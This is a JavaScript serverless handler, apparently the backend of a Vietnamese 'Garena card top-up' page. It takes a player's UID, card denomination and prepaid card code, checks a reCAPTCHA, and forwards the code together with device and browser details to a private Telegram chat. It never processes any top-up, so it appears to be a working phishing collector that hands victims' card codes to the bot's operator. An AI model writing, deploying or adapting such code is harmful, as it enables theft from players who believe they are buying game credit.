// api/telegram.js
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { uid, menhgia, mathe, game, device, captchaToken } = req.body;

    if (!uid || !menhgia || !mathe || !game || !device || !captchaToken) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // Xác thực captcha với Google
    const secretKey = process.env.RECAPTCHA_SECRET_KEY; // Thêm biến môi trường
    if (!secretKey) {
        return res.status(500).json({ error: 'reCAPTCHA secret not configured' });
    }

    const verificationUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captchaToken}`;
    
    try {
        const captchaRes = await fetch(verificationUrl, { method: 'POST' });
        const captchaData = await captchaRes.json();

        if (!captchaData.success) {
            return res.status(400).json({ error: 'Captcha verification failed' });
        }

        // Tiếp tục gửi Telegram như cũ
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            return res.status(500).json({ error: 'Telegram bot not configured' });
        }

        const message = `
🎮 **Giao dịch nạp thẻ Garena**

🆔 **UID:** ${uid}
🎯 **Game:** ${game}
💰 **Mệnh giá:** ${menhgia}
🎫 **Mã thẻ:** ${mathe}

📱 **Thiết bị:**
• Loại: ${device.type || 'Không xác định'}
• HĐH: ${device.os || 'Không xác định'}
• Trình duyệt: ${device.browser || 'Không xác định'}
• User Agent: ${device.ua || 'Không xác định'}

⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}
        `;

        const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown',
            }),
        });

        const telegramData = await telegramRes.json();
        if (!telegramData.ok) throw new Error(telegramData.description);

        return res.status(200).json({ success: true });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}